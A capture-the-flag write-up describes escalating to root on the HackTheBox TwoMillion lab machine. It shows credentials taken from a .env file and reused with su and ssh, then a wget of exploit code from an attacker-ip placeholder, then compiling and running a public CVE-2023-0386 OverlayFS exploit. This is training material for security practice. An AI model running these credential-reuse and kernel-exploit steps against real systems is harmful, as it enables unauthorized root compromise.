# Privilege Escalation on TwoMillion HTB VM
After obtaining a reverse shell as www-data, local enumeration was performed to identify potential privilege escalation vectors.

## Sensitive File Discovery 

While enumerating the web root directory, the `.env` file with sensitive application data and keys was discovered containing database credentials:
```python
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## Credential Reuse
Before interacting with the database, the credentials were tested against local system users:
```bash
su admin
```
The password was reused, granting access to the admin user. This is poor security practice as credentials should not be reused across services.

## Stable Shell via SSH
To obtain a more stable and interactive session, SSH access was established:
```bash
ssh admin@2million.htb
```
Once logged in, it was revealed that the user had unread mail. Further enumeration revealed the mail located at `/var/spool/mail/admin`

The mail contained the following message: "There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty." This suggests that the system may be vulnerable to a known kernel exploit related to `OverlayFS`.

## Exploiting CVE-2023-0386
Research identified CVE-2023-0386, a local privilege escalation vulnerability affecting the Linux kernel’s `OverlayFS` subsystem.

On a high level, the exploit works by creating a malicious file with the `SUID` bit set. Through `OverlayFS` and `FUSE` the kernel incorrectly assigns the file ownership to root. Thus creating a root owned `SUID` binary which allows privilege escalation by running the malicious file as root.

The exploit was obtained and transferred to the target:
```bash
git clone https://github.com/puckiestyle/CVE-2023-0386.git
```

Transfer via HTTP:
```bash
python2 -m http.server 80
```
```bash
wget http://<attacker-ip>/CVE-2023-0386-main.zip
unzip CVE-2023-0386-main.zip
```

The exploit was compiled and executed on the victim:
```bash
make all
./fuse ./ovlcap/lower ./gc
```

In another terminal:
```bash
./exp
```

Upon execution, a root shell was obtained.
